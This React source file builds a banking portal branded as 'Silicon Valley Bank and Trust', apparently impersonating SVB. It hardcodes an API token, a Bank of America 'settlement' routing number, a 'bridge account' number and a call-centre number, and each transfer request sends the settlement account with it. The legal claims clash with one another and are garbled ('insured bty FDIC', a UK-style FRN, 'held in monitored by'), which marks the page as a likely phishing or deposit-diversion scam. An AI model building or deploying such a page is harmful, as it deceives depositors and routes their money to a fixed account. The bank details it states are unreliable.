import React, { useState, useEffect } from 'react';
import { css, merge } from '@emotion/react';

// --- CONFIGURATION ---
const API_BASE = '/api';
const HEADER = "PV-ZNccXvtUXSXMryJANqwAOo6sEbXTGFnx";

// LEGAL ENTITIES - SILICON VALLEY BANK and TRUST (SVB) HISTORY
const BANK_LEGAL_NAME = "Silicon Valley Bank and Trust"; 
const BANK_FRN = "24735"; 
// SVB is a Savings Association (Thrif), insured bty FDIC
const INSURER = "FDIC"; 
const HEADQUARTERS = "3003 Tasman Dr, Santa Clara, CA 95054";
const CALL_CENTER = "844-842-7828";

// SETTLEMENT PARTNERSHIP (Bank of America)
const SETTLEMENT_BANK = "Bank of America, N.A.";
const SETTLEMENT_ROUTING_ELECTRONIC = "026009593"; // ABA for BofA for electronic/clearing
const SETTLEMENT_ROUTING_PAPER = "121000358";
const SETTLEMENT_ACCOUNT = "325223276370"; // The bridge account

const STATUS = {
  idle: 'idle',
  loading: 'loading',
  success: 'success',
  error: 'error',
  contact: 'contact',
  locked: 'locked',
  pending_review: 'pending_review',
};

// --- COMPONENTS ---

function HeaderSection({ config }) {
  const headerStyle = css`
    width: 100%;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0 20px;
    height: 60px;
    background: #fff;
    border-bottom: 2px solid #e0e0e0;
    box-sizing: border-box;
    position: sticky;
    top: 0;
    z-index: 100;
  `;

  const logoStyle = css`
    font-family: 'Inter', sans-serif;
    font-weight: 800;
    font-size: 20px;
    color: #000;
    letter-spacing: -0.5px;
  `;

  const navStyle = css`
    display: flex;
    gap: 20px;
    font-family: 'Inter', sans-serif;
    font-size: 14px;
    color: #666;
  `;

  return (
    <div css={headerStyle}>
      <div css={logoStyle}>{BANK_LEGAL_NAME}</div>
      <div css={navStyle}>
        <span>Personal</span>
        <span>Business</span>
        <span>Sign In</span>
      </div>
    </div>
  );
}

function FooterSection() {
  return (
    <div css={css`
      margin-top: 40px;
      padding: 40px 20px;
      background: #f5f5f5;
      border-top: 1px solid #e0e0e0;
      font-family: 'Inter', sans-serif;
      font-size: 12px;
      color: #666;
      text-align: center;
      line-height: 1.6;
    `}>
      <p css={css`font-weight: 600; color: #333;`}>
        {BANK_LEGAL_NAME} is a state chartered savings bank.
      </p>
      <p css={css`margin-bottom: 10px;`}>
        Member {INSURER}
      </p>
      <p>
        FRN {BANK_FRN}
      </p>
      
      <div css={css`margin: 20px auto; max-width: 600px; padding: 10px; background: #fff; border: 1px solid #e0e0e0; border-radius: 8px;`}>
        <strong>uTransaction Agreement:</strong><br/>
        Deposits are held in monitored by {SETTLEMENT_BANK}.<br/>
        Electronic Routing: {SETTLEMENT_ROUTING_ELECTRONIC} | Paper Routing: {SETTLEMENT_ROUTING_PAPER}
      </div>

      <p css={css`margin-top: 10px; font-size: 11px; color: #999;`}>
        Headquarters: {HEADQUARTERS}<br/>
        Call Center: {CALL_CENTER}
      </p>
      <div css={css`margin-top: 20px; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap;`}>
        <a href="#" css={css`color: #666; text-decoration: none;`}>Privacy Policy</a>
        <a href="#" css={css`color: #666; text-decoration: none;`}>Terms of Service</a>
        <a href="#" css={css`color: #666; text-decoration: none;`}>Consumer Compliance</a>
      </div>
    </div>
  );
}

function TabButton({ active, onClick, children }) {
  return (
    <button
      onClick={onClick}
      css={merge(
        css`
          padding: 10px 20px;
          font-family: 'Inter', sans-serif;
          font-size: 14px;
          font-weight: 500;
          border: none;
          border-radius: 8px;
          cursor: pointer;
          transition: all 0.2s ease;
          margin: 0 5px;
        `,
        active
          ? css`
              background: #000;
              color: #fff;
            `
          : css`
              background: transparent;
              color: #666;
              &:hover {
                background: #f0f0f0;
                color: #000;
              }
            `
      )}
    >
      {children}
    </button>
  );
}

// --- MAIN PORTAL ---

export default function Portal({ config }) {
  const [activeTab, setActiveTab] = useState('Dashboard');
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState(STATUS.idle);
  const [pendingList, setPendingList] = useState([]);
  const [formState, setFormState] = useState({ toAccountId: '', amount: '', description: '', pin: '' });
  const [userData, setUserData] = useState(null);
  
  const tabs = [
    { id: 'Dashboard', label: 'Dashboard' },
    { id: 'Bank Transfer', label: 'Transfer' },
    { id: 'History', label: 'History' },
    { id: 'Settings', label: 'Settings' },
  ];

  useEffect(() => {
    const init = async () => {
      try {
        setLoading(true);
        const res = await fetch(`${API_BASE}/init`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'X-Render-Token': config.renderToken || HEADER,
          },
          body: JSON.stringify({ oauth: true }),
        });
        if (!res.ok) throw new Error('Auth Failed');
        const data = await res.json();
        setUserData(data.user);
      } catch (err) {
        console.error("Init error", err);
        setStatus(STATUS.error);
      } finally {
        setLoading(false);
      }
    };
    init();
  }, [config]);

  const handleTransfer = async () => {
    if (!formState.amount || !formState.toAccountId) return;
    
    try {
      setLoading(true);
      setStatus(STATUS.loading);
      
      const res = await fetch(`${API_BASE}/interbank/initiate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Render-Token': HEADER,
        },
        body: JSON.stringify({
          ...formState,
          amount: parseFloat(formState.amount),
          settlementRouting: SETTLEMENT_ROUTING_ELECTRONIC,
          settlementAccount: SETTLEMENT_ACCOUNT
        }),
      });
      
      if (!res.ok) {
        const errData = await res.json();
        throw new Error(errData.error || 'Transfer failed');
      }
      
      setStatus(STATUS.success);
      setFormState({ toAccountId: '', amount: '', description: '', pin: '' });
      setActiveTab('History');
      
      setTimeout(() => setStatus(STATUS.idle), 3000);

    } catch (err) {
      console.error("Transfer Error:", err);
      setStatus(STATUS.error);
    } finally {
      setLoading(false);
    }
  };

  if (loading && !userData) return <div css={css`min-height: 100vh; display: flex; justify-content: center; align-items: center;`}>Loading {BANK_LEGAL_NAME}...</div>;

  return (
    <div css={css`min-height: 100vh; background: #fafafa; font-family: 'Inter', sans-serif; display: flex; flex-direction: column;`}>
      <HeaderSection config={config} />

      <div css={css`flex: 1; padding: 40px 20px; max-width: 800px; margin: 0 auto; width: 100%; box-sizing: border-box;`}>
        
        {/* STATUS MESSAGES */}
        {status === STATUS.error && (
          <div css={css`background: #fee2e2; color: #991b1b; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; border: 1px solid #fecaca;`}>
            Transaction failed. Please verify your details and try again.
          </div>
        )}
        {status === STATUS.success && (
          <div css={css`background: #dcfce7; color: #166534; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; border: 1px solid #bbf7d0;`}>
              Transfer authorized. Settlement via {SETTLEMENT_BANK} is pending.
          </div>
        )}

        {/* TABS */}
        <div css={css`display: flex; margin-bottom: 30px; border-bottom: 1px solid #e0e0e0; padding-bottom: 10px;`}>
          {tabs.map(tab => (
            <TabButton 
              key={tab.id} 
              active={activeTab === tab.id} 
              onClick={() => setActiveTab(tab.id)}
            >
              {tab.label}
            </TabButton>
          ))}
        </div>

        {/* CONTENT */}
        <div css={css`background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); border: 1px solid #e5e7eb;`}>
          
          {activeTab === 'Dashboard' && (
            <div>
              <h2 css={css`font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #111;`}>Account Summary</h2>
              <div css={css`display: grid; grid-template-columns: 1fr 1fr; gap: 20px;`}>
                <div css={css`padding: 20px; background: #f9fafb; border-radius: 8px; border: 1px solid #e5e7eb;`}>
                  <div css={css`font-size: 14px; color: #666; margin-bottom: 5px;`}>Available Balance</div>
                  <div css={css`font-size: 28px; font-weight: 700; color: #111;`}>$0.00</div>
                </div>
                <div css={css`padding: 20px; background: #f9fafb; border-radius: 8px; border: 1px solid #e5e7eb;`}>
                  <div css={css`font-size: 14px; color: #666; margin-bottom: 5px;`}>Pending Transfers</div>
                  <div css={css`font-size: 28px; font-weight: 700; color: #111;`}>$0.00</div>
                </div>
              </div>
              <div css={css`margin-top: 20px; padding: 15px; background: #eff6ff; border-radius: 8px; border: 1px solid #bfdbfe; font-size: 13px; color: #1e40af;`}>
                <strong>Notice:</strong> As part of our settlement partnership, funds may transit via {SETTLEMENT_BANK} (ABA: {SETTLEMENT_ROUTING_ELECTRONIC}).
              </div>
            </div>
          )}

          {activeTab === 'Bank Transfer' && (
            <div>
              <h2 css={css`font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #111;`}>External Transfer</h2>
              <div css={css`max-width: 400px;`}>
                <div css={css`margin-bottom: 15px;`}>
                  <label css={css`display: block; font-size: 14px; color: #374151; margin-bottom: 5px; font-weight: 500;`}>To Account ID</label>
                  <input 
                    type="text" 
                    value={formState.toAccountId} 
                    onChange={e => setFormState({...formState, toAccountId: e.target.value})} 
                    css={css`width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 16px; box-sizing: border-box;`} 
                    placeholder="e.g. 802866-XXXX"
                  />
                </div>
                <div css={css`margin-bottom: 15px;`}>
                  <label css={css`display: block; font-size: 14px; color: #374151; margin-bottom: 5px; font-weight: 500;`}>Amount (USD)</label>
                  <input 
                    type="number" 
                    value={formState.amount} 
                    onChange={e => setFormState({...formState, amount: e.target.value})} 
                    css={css`width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 16px; box-sizing: border-box;`} 
                    placeholder="0.00"
                  />
                </div>
                <div css={css`margin-bottom: 20px;`}>
                  <label css={css`display: block; font-size: 14px; color: #374151; margin-bottom: 5px; font-weight: 500;`}>Description</label>
                  <input 
                    type="text" 
                    value={formState.description} 
                    onChange={e => setFormState({...formState, description: e.target.value})} 
                    css={css`width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 16px; box-sizing: border-box;`} 
                    placeholder="Payroll, Rent, etc."
                  />
                </div>
                
                <button 
                  onClick={handleTransfer} 
                  disabled={loading}
                  css={css`
                    width: 100%;
                    padding: 12px;
                    background: #111;
                    color: #fff;
                    border: none;
                    border-radius: 6px;
                    font-size: 16px;
                    font-weight: 600;
                    cursor: pointer;
                    &:disabled { background: #666; cursor: not-allowed; }
                  `}
                >
                  {loading ? 'Processing...' : `Initiate Transfer from ${BANK_LEGAL_NAME}`}
                </button>
                
                <div css={css`margin-top: 15px; font-size: 11px; color: #999; text-align: center;`}>
                    Settlement Routing: {SETTLEMENT_ROUTING_ELECTRONIC} <br/>
                    Settlement Account: {SETTLEMENT_ACCOUNT}
                </div>
              </div>
            </div>
          )}

          {activeTab === 'History' && (
            <div>
              <h2 css={css`font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #111;`}>Transaction History</h2>
              <p css={css`color: #666;`}>No transactions found for this period.</p>
            </div>
          )}
        </div>
      </div>

      <FooterSection />
    </div>
  );
}
